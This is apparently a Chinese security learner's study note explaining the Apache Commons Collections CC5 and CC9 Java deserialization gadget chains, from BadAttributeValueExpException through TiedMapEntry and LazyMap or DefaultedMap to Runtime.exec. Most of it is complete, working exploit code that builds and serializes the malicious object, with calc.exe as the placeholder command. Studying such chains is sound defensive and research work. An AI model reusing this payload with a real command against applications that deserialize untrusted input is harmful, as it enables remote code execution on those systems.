# 前言
Java Version: < 1.8.0_8u76 (or else no SecurityManager, [Patch](https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70))


# CC5链子流程

我们的入口类是`BadAttributeValueExpException`
其中的`readObject()`中调用了`toString()`

![[Pasted image 20251215151447.png]]

接着我们发现TiedMapEntry类中的toString()方法中调用了`getValue()`

![[Pasted image 20251215151510.png]]
从而走到getValue，中的get方法，后面接上我们的`LazyMap.get()`走我们LazyMap的经典的命令执行
![[Pasted image 20251215151605.png]]![[Pasted image 20251215151711.png]]

# CC5exp
首先我们看看我们的入口
由于我们构造方法中val赋值为val.toString()，我们比较难控制，
所以我们先构造的时候传入一个安全对象或者null，再进行反射修改val属性的值。
![[Pasted image 20251215153835.png]]

于是我们构造exp如下
```java
package com.example.demo.CC.CC5;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.management.BadAttributeValueExpException;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC5Test {  
    public static void main(String[] args) throws Exception {  
  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})  
        };  
  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
  
  
        HashMap<Object, Object> hashmap = new HashMap<>();  
        Map lazymap = LazyMap.decorate(hashmap, chainedTransformer);  
  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "");  
  
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);  
  
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");  
        val.setAccessible(true);  
        val.set(badAttributeValueExpException,tiedMapEntry);  
  
        serialize(badAttributeValueExpException);  
        unserialize("ser.bin");  
  
  
    }  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
}
```


# CC9
cc9与5的区别是，我们替换lazymap为DefaultedMap
同样是get方法，可以调用到trasnsform，
![[Pasted image 20251215162606.png]]

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
            "getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer(
            "invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
    new InvokerTransformer(
            "exec", new Class[]{String.class}, new Object[]{"calc"}),
    new ConstantTransformer(1)
};
Transformer transformerChain = new ChainedTransformer(transformers);

Map innerMap = new HashMap();
Map map = DefaultedMap.decorate(innerMap, transformerChain);
TiedMapEntry entry = new TiedMapEntry(map, "");

BadAttributeValueExpException bavee = new BadAttributeValueExpException(null);
Field field = BadAttributeValueExpException.class.getDeclaredField("val");
field.setAccessible(true);
field.set(bavee, entry);

return bavee;
```
